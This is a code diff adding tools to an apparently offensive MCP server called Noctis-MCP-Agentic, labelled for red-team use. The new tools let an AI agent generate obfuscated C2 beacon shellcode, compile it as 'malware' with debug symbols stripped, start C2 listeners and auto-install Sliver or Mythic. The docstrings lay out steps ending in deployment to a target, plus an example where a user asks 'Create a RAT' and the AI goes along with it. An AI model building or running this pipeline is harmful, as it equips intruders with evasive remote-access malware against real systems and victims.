@@ -56,6 +56,7 @@ WARNING: For authorized security research and red team operations only.
 
 import sys
 import os
+import platform
 import logging
 from typing import Dict, Any, Optional, List
 import requests
@@ -76,6 +77,10 @@ mcp = FastMCP("Noctis-MCP-Agentic")
 # Global configuration
 SERVER_URL = "http://localhost:8888"
 session = requests.Session()
+
+# Detect client OS (where this MCP client is running)
+CLIENT_OS = platform.system()  # Returns: 'Windows', 'Linux', 'Darwin'
+logger = logging.getLogger("noctis-mcp")
 
 # Setup logging
 logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
@@ -233,6 +238,8 @@ def generate_code(
         'technique_ids': technique_ids,
         'objective': f"Implement {', '.join(technique_ids)}",
         'target_av': target_av,
+        'target_os': target_os,
+        'client_os': CLIENT_OS,
         'opsec_level': opsec_level
     })
     return format_response(response, 'code')
@@ -489,6 +496,232 @@ def record_feedback(
         'detection_details': details
     })
     return format_response(response, 'general')
+
+
+# ============================================================================
+# C2 INTEGRATION TOOLS (Phase 5 - Malware Factory)
+# ============================================================================
+
+@mcp.tool()
+def generate_c2_beacon(
+    framework: str,
+    listener_host: str,
+    listener_port: int,
+    protocol: str = "https",
+    architecture: str = "x64",
+    techniques: List[str] = None
+) -> str:
+    """
+    🎯 Generate C2 beacon shellcode from installed framework (Linux only).
+
+    This tool calls the actual C2 framework (Sliver/Mythic/Adaptix) to generate
+    beacon shellcode that can be wrapped with Noctis obfuscation techniques.
+
+    ⚠️ REQUIREMENTS:
+    - Linux client only (C2 server cannot run on Windows)
+    - C2 framework must be installed (use install_c2_framework() if not)
+    - C2 server must be running
+
+    Args:
+        framework: 'sliver', 'mythic', or 'adaptix'
+        listener_host: C2 server IP/domain (e.g., "192.168.1.100" or "c2.example.com")
+        listener_port: C2 server port (e.g., 443, 8443)
+        protocol: Protocol to use - 'https', 'http', 'dns', 'mtls', 'tcp'
+        architecture: 'x64' or 'x86'
+        techniques: Optional Noctis technique IDs to apply (e.g., ["syscalls", "injection"])
+
+    Returns:
+        {
+            "success": True,
+            "shellcode_path": "/tmp/beacon_shellcode.bin",
+            "shellcode_size": 45056,
+            "c2_url": "https://192.168.1.100:443",
+            "framework": "sliver",
+            "opsec_score": 8.5,
+            "instructions": {
+                "listener_setup": "sliver > https --lhost 192.168.1.100 --lport 443",
+                "next_steps": [
+                    "1. Start C2 listener (see listener_setup)",
+                    "2. Wrap shellcode with beacon_stealth.c template",
+                    "3. Compile using compile_malware() tool",
+                    "4. Deploy to target and wait for callback"
+                ]
+            }
+        }
+
+    Example Workflow:
+        1. generate_c2_beacon('sliver', '192.168.1.100', 443, 'https')
+        2. Receive shellcode path
+        3. Integrate into beacon_stealth.c template
+        4. Call compile_malware()
+        5. User starts listener and deploys
+    """
+    response = api_post(f'/api/c2/{framework}/generate', {
+        'listener_host': listener_host,
+        'listener_port': listener_port,
+        'protocol': protocol,
+        'architecture': architecture,
+        'techniques': techniques or [],
+        'obfuscate': True
+    })
+    return format_response(response, 'c2_beacon')
+
+
+@mcp.tool()
+def compile_malware(
+    source_code: str,
+    output_name: str = "payload",
+    architecture: str = "x64",
+    optimization: str = "O2",
+    strip_debug: bool = True
+) -> str:
+    """
+    🔨 Compile malware code to executable binary.
+
+    Uses remote compilation service with MinGW cross-compilation (Linux→Windows).
+    Supports C, C++, and assembly files.
+
+    Args:
+        source_code: Complete C/C++ source code
+        output_name: Output filename (without extension)
+        architecture: 'x64' or 'x86'
+        optimization: 'O0' (none), 'O1', 'O2', 'O3' (aggressive)
+        strip_debug: Remove debug symbols (recommended for OPSEC)
+
+    Returns:
+        {
+            "success": True,
+            "binary_path": "/tmp/payload.exe",
+            "binary_size": 45056,
+            "compilation_time": 2.3,
+            "hash": {
+                "md5": "...",
+                "sha256": "..."
+            },
+            "instructions": {
+                "download_command": "Download from server",
+                "deploy_to_target": "Transfer payload.exe to target Windows system"
+            }
+        }
+
+    Example:
+        # After integrating C2 shellcode into template
+        result = compile_malware(beacon_code, "beacon", "x64", "O2")
+        # Returns compiled beacon.exe ready for deployment
+    """
+    response = api_post('/api/compile', {
+        'code': source_code,
+        'output_name': output_name,
+        'architecture': architecture,
+        'optimization': optimization,
+        'strip_debug': strip_debug
+    })
+    return format_response(response, 'compilation')
+
+
+@mcp.tool()
+def setup_c2_listener(
+    framework: str,
+    protocol: str = "https",
+    lhost: str = "0.0.0.0",
+    lport: int = 443
+) -> str:
+    """
+    🎧 Set up C2 listener to receive callbacks from deployed beacons.
+
+    Automatically configures and starts listener on specified C2 framework.
+
+    ⚠️ REQUIREMENTS:
+    - Linux client only
+    - C2 framework must be installed
+    - C2 server must be running
+    - Appropriate ports must be available
+
+    Args:
+        framework: 'sliver', 'mythic', or 'adaptix'
+        protocol: 'https', 'http', 'dns', 'mtls', 'tcp'
+        lhost: Listen address (0.0.0.0 = all interfaces, or specific IP)
+        lport: Listen port (443, 8443, 80, etc.)
+
+    Returns:
+        {
+            "success": True,
+            "listener_id": "abc123",
+            "listener_url": "https://192.168.1.100:443",
+            "status": "listening",
+            "instructions": {
+                "manual_command": "sliver > https --lhost 0.0.0.0 --lport 443",
+                "check_status": "Listener is active and waiting for callbacks",
+                "next_steps": "Deploy beacon to target and wait for callback"
+            }
+        }
+
+    Example:
+        setup_c2_listener('sliver', 'https', '0.0.0.0', 443)
+        # Listener ready - deploy beacon and wait for callback
+    """
+    # Note: This may need a new endpoint or use existing C2 adapter methods
+    response = api_post(f'/api/c2/{framework}/listener/start', {
+        'protocol': protocol,
+        'lhost': lhost,
+        'lport': lport
+    })
+    return format_response(response, 'listener')
+
+
+@mcp.tool()
+def install_c2_framework(
+    framework: str = "sliver",
+    auto_start: bool = True
+) -> str:
+    """
+    📦 Auto-install C2 framework on Linux system.
+
+    Automatically downloads and installs the specified C2 framework.
+    This enables full integrated C2 beacon generation.
+
+    ⚠️ REQUIREMENTS:
+    - Linux client only (Windows cannot run C2 server)
+    - Sudo permissions (will prompt for password)
+    - Internet connection
+    - curl and git installed
+
+    ⏱️ INSTALL TIME:
+    - Sliver: ~2-3 minutes
+    - Mythic: ~5-10 minutes (requires Docker)
+
+    Args:
+        framework: 'sliver' (recommended) or 'mythic'
+        auto_start: Automatically start C2 server after install
+
+    Returns:
+        {
+            "success": True,
+            "framework": "sliver",
+            "install_path": "/usr/local/bin/sliver-client",
+            "install_time": 145.2,
+            "status": "installed_and_running",
+            "instructions": {
+                "verify_install": "sliver-client version",
+                "start_server": "sliver-server",
+                "connect_client": "sliver-client",
+                "next_steps": "C2 framework ready - you can now generate integrated beacons"
+            }
+        }
+
+    Example Workflow (Linux user without C2):
+        User: "Create a RAT"
+        AI detects: No C2 installed
+        AI asks: "Would you like to install Sliver C2 for full integration? (2-3 min)"
+        User: "Yes"
+        AI calls: install_c2_framework('sliver', auto_start=True)
+        Result: Sliver installed, ready for beacon generation
+    """
+    response = api_post('/api/c2/install', {
+        'framework': framework,
+        'auto_start': auto_start
+    })
+    return format_response(response, 'installation')
 
 
 # ============================================================================
